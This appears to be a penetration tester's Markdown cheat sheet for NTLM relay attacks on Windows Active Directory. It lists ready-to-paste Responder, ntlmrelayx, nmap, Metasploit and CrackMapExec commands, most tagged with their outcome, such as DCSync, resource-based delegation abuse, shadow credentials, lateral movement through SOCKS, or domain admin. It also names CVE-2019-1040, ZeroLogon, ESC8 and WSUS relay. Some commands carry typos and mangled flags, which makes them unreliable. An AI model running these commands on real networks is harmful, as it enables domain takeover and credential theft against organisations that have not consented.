### Listener Setup
- Tools
- Responder to force LM downgrade
```
responder -I eth0
```
- Use for SMB enumeration or listening
```
smbclient.py
```
### NTLM Relay
- Relay on itself
- MS08-068 Use exploit/windows/smb/smb_relay for windows2000 -> windows server 2008 = ADMIN
- SMB to LDAP(S)
	- NetNTLMv1 > remove mic > relay to LDAP exploitation for relaying SMB to LDAP(S)
	- NetNTLMv2 > remove mic (CVE-2019-1040) Commands for removing MIC and escalating privileges
```
ntlmrelayx --remove-mic --escalte-user <USER> -t ldap://<DC_FQDN> -smb2support #Outcome = DcSync
```
```
ntlmrelayx.py -t ldap://<DC> --remove-mic --add-computer <COMPUTER_NAME> <COMPUTER_PASSWORD> --delegate-access -smb2support #Outcome = RBCD
```
```
ntlmrelayx.py -t ldap://<DC> --shadow-credentials --shadow-target '<DC>'
```
- HTTP(S) to LDAP > relay to LDAP
	- Relay and RBCD (Resource-Based constrained Delegation)
```
ntlmrelayx.py -t ldap://<DC> --shadow-credentials --shadow-target <DC>
```
- SMB to SMB
	- Find SMB Not Signed (Scans for unsigned SMB on non-DCs)
```
nmap -Pn -sS -T4 --open --script smb-security-mode -p445 ADDRESS/MASK
```
```
use exploit/windows/smb/smb_relay
```
```
cme smb $hosts --gen-relay-list relay.txt
```
- Relay Commands
```
ntlmrelayx.py -wh <ATTACKER_IP> -tf targets.txt smb://<TARGET> -l /tmp -6 -debug #Outcome = User
```
```
`ntlmrelayx.py -tf targets.txt -smb2support -socks (-6) #Outcome = Lateral move (socks)
```
- Metasploit Module
```
use exploit/windows/smb/smb_relay
```
- CrackMapExec
```
cme smb $hosts --gen-relay-list relay.txt
```
- MSSQL
	- Relay to MSSQL
```
ntlmrelayx.py -t mssql://<IP> --smb2support --socks #Outcome = lateral move (socks)
```
### Specific Exploits and Vulnerabilities
- CVE-2019-1040 
	- A vulnerability involving the removal of MIC to bypass security measures
- ZeroLogon (Safe Method - CVE-2020-1472)
	- A method to exploit and relay smb to netlogon securely
- ESC8
	- HTTP ADCS web-based NTLM relay attack
### ARP Poisening (possibly from smbclient.py)
- Tool for contucting the ARP poisening and man-in-the-middle attacks
	- pywusus.py
- WSUS Relay
	- Specialized attacks targeting Windows Server Update Services (WSUS) to relay and compromise
### Outcomes and Accesses
- Admin and Domain Admin Access
	- Achieved through the use or relayed credentials and exploits
- DcSync
	- Using relays to request directory replication service data
- Shadow Credentials
	- Creating shadow credentials for lateral movement and persistence
- RBCD
	- Exploiting Resource-Based Constrained Delegation for extended access